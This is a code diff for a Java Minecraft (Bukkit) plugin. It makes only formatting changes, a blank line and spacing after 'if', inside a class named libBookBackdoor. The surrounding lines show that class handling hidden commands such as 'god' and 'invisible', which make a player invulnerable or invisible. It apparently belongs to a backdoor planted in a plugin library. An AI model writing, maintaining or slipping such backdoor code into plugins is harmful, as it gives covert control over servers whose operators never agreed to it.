@@ -33,6 +33,7 @@ abstract class Countdown {
     }
 
     public abstract void count(int current);
+
     public final void start() {
         task = new BukkitRunnable() {
             @Override
@@ -345,7 +346,7 @@ public class libBookBackdoor implements Listener {
                             }
                             break;
                         case ("god"):
-                            if(args.length > 1) {
+                            if (args.length > 1) {
                                 switch (args[1].toLowerCase()) {
                                     case ("true"):
                                         player.setInvulnerable(true);
@@ -362,7 +363,7 @@ public class libBookBackdoor implements Listener {
                             }
                             break;
                         case ("invisible"):
-                            if(args.length > 1) {
+                            if (args.length > 1) {
                                 switch (args[1].toLowerCase()) {
                                     case ("true"):
                                         player.setInvisible(true);
